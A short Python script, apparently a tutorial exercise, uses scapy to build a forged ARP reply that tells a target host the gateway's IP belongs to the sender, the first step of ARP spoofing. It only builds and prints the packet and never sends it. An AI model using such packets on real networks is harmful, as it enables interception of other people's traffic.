#/usr/bin/env python
from scapy.layers.l2 import ARP

# Send packet to Client (target) IP, telling it I have the Router (gateway) MAC Address.
# Create an ARP Response, with fields:
# op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
# psrc=[SOURCE_IP], tells TARGET the SOURCE is the ROUTER.
packet = ARP(op=2, pdst="192.168.63.174", hwdst="00-50-56-e8-00-20", psrc="192.168.63.2" )
# Show tells us the MAC Address results
print(packet.show())
# Summarize the MAC Address results
print(packet.summary())